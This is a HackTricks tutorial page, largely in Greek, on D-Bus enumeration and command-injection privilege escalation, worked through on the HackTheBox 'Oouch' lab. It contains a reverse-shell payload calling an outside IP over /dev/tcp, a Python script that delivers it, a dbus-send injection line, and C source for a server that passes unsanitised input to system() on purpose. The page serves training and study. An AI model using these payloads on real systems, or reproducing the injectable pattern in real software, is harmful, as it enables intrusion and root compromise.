# D-Bus Enumeration & Command Injection Privilege Escalation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **GUI enumeration**

Το D-Bus χρησιμοποιείται ως ο μεσολαβητής επικοινωνίας διεργασιών (IPC) σε περιβάλλοντα επιφάνειας εργασίας Ubuntu. Στο Ubuntu, παρατηρείται η ταυτόχρονη λειτουργία αρκετών λεωφορείων μηνυμάτων: το σύστημα λεωφορείο, που χρησιμοποιείται κυρίως από **υπηρεσίες με προνόμια για να εκθέσουν υπηρεσίες σχετικές με το σύστημα**, και ένα λεωφορείο συνεδρίας για κάθε συνδεδεμένο χρήστη, εκθέτοντας υπηρεσίες σχετικές μόνο με αυτόν τον συγκεκριμένο χρήστη. Η εστίαση εδώ είναι κυρίως στο σύστημα λεωφορείο λόγω της σύνδεσής του με υπηρεσίες που εκτελούνται με υψηλότερα προνόμια (π.χ., root) καθώς ο στόχος μας είναι να ανυψώσουμε τα προνόμια. Σημειώνεται ότι η αρχιτεκτονική του D-Bus χρησιμοποιεί έναν 'δρομολογητή' ανά λεωφορείο συνεδρίας, ο οποίος είναι υπεύθυνος για την ανακατεύθυνση των μηνυμάτων πελατών στις κατάλληλες υπηρεσίες με βάση τη διεύθυνση που καθορίζεται από τους πελάτες για την υπηρεσία με την οποία επιθυμούν να επικοινωνήσουν.

Οι υπηρεσίες στο D-Bus ορίζονται από τα **αντικείμενα** και **διεπαφές** που εκθέτουν. Τα αντικείμενα μπορούν να παρομοιαστούν με τις περιπτώσεις κλάσεων σε τυπικές γλώσσες OOP, με κάθε περίπτωση να αναγνωρίζεται μοναδικά από μια **διαδρομή αντικειμένου**. Αυτή η διαδρομή, παρόμοια με μια διαδρομή συστήματος αρχείων, αναγνωρίζει μοναδικά κάθε αντικείμενο που εκτίθεται από την υπηρεσία. Μια βασική διεπαφή για ερευνητικούς σκοπούς είναι η διεπαφή **org.freedesktop.DBus.Introspectable**, η οποία διαθέτει μια μοναδική μέθοδο, Introspect. Αυτή η μέθοδος επιστρέφει μια XML αναπαράσταση των υποστηριζόμενων μεθόδων, σημάτων και ιδιοτήτων του αντικειμένου, με εστίαση εδώ στις μεθόδους ενώ παραλείπονται οι ιδιότητες και τα σήματα.

Για την επικοινωνία με τη διεπαφή D-Bus, χρησιμοποιήθηκαν δύο εργαλεία: ένα εργαλείο CLI ονόματι **gdbus** για εύκολη κλήση μεθόδων που εκτίθενται από το D-Bus σε σενάρια, και το [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), ένα εργαλείο GUI βασισμένο σε Python σχεδιασμένο για να καταγράφει τις διαθέσιμες υπηρεσίες σε κάθε λεωφορείο και να εμφανίζει τα αντικείμενα που περιέχονται σε κάθε υπηρεσία.
```bash
sudo apt-get install d-feet
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)


Στην πρώτη εικόνα εμφανίζονται οι υπηρεσίες που είναι καταχωρημένες με το σύστημα D-Bus, με το **org.debin.apt** να επισημαίνεται ειδικά μετά την επιλογή του κουμπιού System Bus. Το D-Feet ερωτά αυτή την υπηρεσία για αντικείμενα, εμφανίζοντας διεπαφές, μεθόδους, ιδιότητες και σήματα για επιλεγμένα αντικείμενα, όπως φαίνεται στη δεύτερη εικόνα. Η υπογραφή κάθε μεθόδου είναι επίσης λεπτομερής.

Μια αξιοσημείωτη δυνατότητα είναι η εμφάνιση του **process ID (pid)** και της **γραμμής εντολών** της υπηρεσίας, χρήσιμη για την επιβεβαίωση αν η υπηρεσία εκτελείται με ανυψωμένα δικαιώματα, σημαντική για την έρευνα.

**Το D-Feet επιτρέπει επίσης την κλήση μεθόδων**: οι χρήστες μπορούν να εισάγουν εκφράσεις Python ως παραμέτρους, τις οποίες το D-Feet μετατρέπει σε τύπους D-Bus πριν τις περάσει στην υπηρεσία.

Ωστόσο, σημειώστε ότι **ορισμένες μέθοδοι απαιτούν αυθεντικοποίηση** πριν μας επιτρέψουν να τις καλέσουμε. Θα αγνοήσουμε αυτές τις μεθόδους, καθώς ο στόχος μας είναι να ανυψώσουμε τα δικαιώματά μας χωρίς διαπιστευτήρια εξαρχής.

Επίσης, σημειώστε ότι ορισμένες από τις υπηρεσίες ερωτούν μια άλλη υπηρεσία D-Bus που ονομάζεται org.freedeskto.PolicyKit1 αν θα πρέπει να επιτραπεί σε έναν χρήστη να εκτελέσει ορισμένες ενέργειες ή όχι.

## **Cmd line Enumeration**

### Λίστα Αντικειμένων Υπηρεσίας

Είναι δυνατόν να καταγραφούν οι ανοιχτές διεπαφές D-Bus με:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
#### Συνδέσεις

[Από τη wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Όταν μια διαδικασία δημιουργεί μια σύνδεση σε ένα λεωφορείο, το λεωφορείο αναθέτει στη σύνδεση ένα ειδικό όνομα λεωφορείου που ονομάζεται _μοναδικό όνομα σύνδεσης_. Τα ονόματα λεωφορείου αυτού του τύπου είναι αμετάβλητα—είναι εγγυημένο ότι δεν θα αλλάξουν όσο υπάρχει η σύνδεση—και, πιο σημαντικά, δεν μπορούν να ξαναχρησιμοποιηθούν κατά τη διάρκεια της ζωής του λεωφορείου. Αυτό σημαίνει ότι καμία άλλη σύνδεση σε αυτό το λεωφορείο δεν θα έχει ποτέ ανατεθεί ένα τέτοιο μοναδικό όνομα σύνδεσης, ακόμη και αν η ίδια διαδικασία κλείσει τη σύνδεση στο λεωφορείο και δημιουργήσει μια νέα. Τα μοναδικά ονόματα σύνδεσης είναι εύκολα αναγνωρίσιμα επειδή ξεκινούν με τον—κατά τα άλλα απαγορευμένο—χαρακτήρα άνω και κάτω τελείας.

### Πληροφορίες Αντικειμένου Υπηρεσίας

Στη συνέχεια, μπορείτε να αποκτήσετε κάποιες πληροφορίες σχετικά με τη διεπαφή με:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
### Λίστα Διεπαφών ενός Αντικειμένου Υπηρεσίας

Πρέπει να έχετε αρκετές άδειες.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Introspect Interface of a Service Object

Σημειώστε πώς σε αυτό το παράδειγμα επιλέχθηκε η πιο πρόσφατη διεπαφή που ανακαλύφθηκε χρησιμοποιώντας την παράμετρο `tree` (_δείτε την προηγούμενη ενότητα_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Σημειώστε τη μέθοδο `.Block` της διεπαφής `htb.oouch.Block` (αυτή που μας ενδιαφέρει). Το "s" των άλλων στηλών μπορεί να σημαίνει ότι περιμένει μια συμβολοσειρά.

### Διεπαφή Παρακολούθησης/Καταγραφής

Με αρκετά δικαιώματα (μόνο τα δικαιώματα `send_destination` και `receive_sender` δεν είναι αρκετά) μπορείτε να **παρακολουθήσετε μια επικοινωνία D-Bus**.

Για να **παρακολουθήσετε** μια **επικοινωνία** θα χρειαστεί να είστε **root.** Αν εξακολουθείτε να έχετε προβλήματα ως root, ελέγξτε [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) και [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

{% hint style="warning" %}
Αν ξέρετε πώς να ρυθμίσετε ένα αρχείο ρύθμισης D-Bus για να **επιτρέψετε σε μη root χρήστες να παρακολουθούν** την επικοινωνία, παρακαλώ **επικοινωνήστε μαζί μου**!
{% endhint %}

Διαφορετικοί τρόποι παρακολούθησης:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
Στο παρακάτω παράδειγμα, η διεπαφή `htb.oouch.Block` παρακολουθείται και **το μήνυμα "**_**lalalalal**_**" αποστέλλεται μέσω παρεξήγησης**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Μπορείτε να χρησιμοποιήσετε το `capture` αντί για το `monitor` για να αποθηκεύσετε τα αποτελέσματα σε ένα αρχείο pcap.

#### Φιλτράρισμα όλων των θορύβων <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Αν υπάρχει πάρα πολλές πληροφορίες στο λεωφορείο, περάστε έναν κανόνα αντιστοίχισης όπως παρακάτω:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Πολλοί κανόνες μπορούν να καθοριστούν. Εάν ένα μήνυμα ταιριάζει με _οποιονδήποτε_ από τους κανόνες, το μήνυμα θα εκτυπωθεί. Έτσι:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Δείτε την [τεκμηρίωση D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html) για περισσότερες πληροφορίες σχετικά με τη σύνταξη κανόνων αντιστοίχισης.

### Περισσότερα

`busctl` έχει ακόμη περισσότερες επιλογές, [**βρείτε όλες εδώ**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Ευάλωτο Σενάριο**

Ως χρήστης **qtc μέσα στον υπολογιστή "oouch" από το HTB** μπορείτε να βρείτε ένα **αναμενόμενο αρχείο ρυθμίσεων D-Bus** που βρίσκεται στο _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Σημειώστε από την προηγούμενη διαμόρφωση ότι **θα χρειαστεί να είστε ο χρήστης `root` ή `www-data` για να στείλετε και να λάβετε πληροφορίες** μέσω αυτής της επικοινωνίας D-BUS.

Ως χρήστης **qtc** μέσα στο κοντέινερ docker **aeb4525789d8** μπορείτε να βρείτε κάποιο κώδικα σχετικό με το dbus στο αρχείο _/code/oouch/routes.py._ Αυτός είναι ο ενδιαφέρον κώδικας:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Όπως μπορείτε να δείτε, **συνδέεται σε μια διεπαφή D-Bus** και στέλνει στη **λειτουργία "Block"** το "client\_ip".

Στην άλλη πλευρά της σύνδεσης D-Bus εκτελείται κάποιο C compiled binary. Αυτός ο κώδικας **ακούει** στη σύνδεση D-Bus **για διευθύνσεις IP και καλεί το iptables μέσω της `system` λειτουργίας** για να μπλοκάρει τη δεδομένη διεύθυνση IP.\
**Η κλήση στη `system` είναι ευάλωτη σκόπιμα σε command injection**, οπότε ένα payload όπως το παρακάτω θα δημιουργήσει ένα reverse shell: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Εκμεταλλευτείτε το

Στο τέλος αυτής της σελίδας μπορείτε να βρείτε τον **ολοκληρωμένο C κώδικα της εφαρμογής D-Bus**. Μέσα σε αυτόν μπορείτε να βρείτε μεταξύ των γραμμών 91-97 **πώς η `D-Bus object path`** **και το `interface name`** είναι **καταχωρημένα**. Αυτές οι πληροφορίες θα είναι απαραίτητες για να στείλετε πληροφορίες στη σύνδεση D-Bus:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Επίσης, στη γραμμή 57 μπορείτε να βρείτε ότι **η μόνη μέθοδος που έχει καταχωρηθεί** για αυτή την επικοινωνία D-Bus ονομάζεται `Block`(_**Γι' αυτό στην επόμενη ενότητα τα payloads θα σταλούν στο αντικείμενο υπηρεσίας `htb.oouch.Block`, τη διεπαφή `/htb/oouch/Block` και το όνομα της μεθόδου `Block`**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Ο παρακάτω κώδικας python θα στείλει το payload στη σύνδεση D-Bus στη μέθοδο `Block` μέσω `block_iface.Block(runme)` (_σημειώστε ότι έχει εξαχθεί από το προηγούμενο κομμάτι κώδικα_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl και dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
* `dbus-send` είναι ένα εργαλείο που χρησιμοποιείται για την αποστολή μηνυμάτων στο “Message Bus”
* Message Bus – Ένα λογισμικό που χρησιμοποιείται από τα συστήματα για να διευκολύνει τις επικοινωνίες μεταξύ εφαρμογών. Σχετίζεται με το Message Queue (τα μηνύματα είναι διατεταγμένα σε ακολουθία) αλλά στο Message Bus τα μηνύματα αποστέλλονται σε μοντέλο συνδρομής και είναι επίσης πολύ γρήγορα.
* Η ετικέτα “-system” χρησιμοποιείται για να αναφέρει ότι είναι ένα σύστημα μήνυμα, όχι ένα μήνυμα συνεδρίας (κατά προεπιλογή).
* Η ετικέτα “–print-reply” χρησιμοποιείται για να εκτυπώσει το μήνυμά μας κατάλληλα και να λάβει οποιεσδήποτε απαντήσεις σε αναγνώσιμη μορφή από άνθρωπο.
* “–dest=Dbus-Interface-Block” Η διεύθυνση της διεπαφής Dbus.
* “–string:” – Τύπος μηνύματος που θέλουμε να στείλουμε στη διεπαφή. Υπάρχουν διάφορες μορφές αποστολής μηνυμάτων όπως διπλά, bytes, booleans, int, objpath. Από αυτά, το “object path” είναι χρήσιμο όταν θέλουμε να στείλουμε μια διαδρομή ενός αρχείου στη διεπαφή Dbus. Μπορούμε να χρησιμοποιήσουμε ένα ειδικό αρχείο (FIFO) σε αυτή την περίπτωση για να περάσουμε μια εντολή στη διεπαφή με το όνομα ενός αρχείου. “string:;” – Αυτό είναι για να καλέσουμε ξανά το object path όπου τοποθετούμε το αρχείο/εντολή FIFO reverse shell.

_Σημειώστε ότι στο `htb.oouch.Block.Block`, το πρώτο μέρος (`htb.oouch.Block`) αναφέρεται στο αντικείμενο υπηρεσίας και το τελευταίο μέρος (`.Block`) αναφέρεται στο όνομα της μεθόδου._

### C code

{% code title="d-bus_server.c" %}
```c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
{% endcode %}

## Αναφορές
* [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
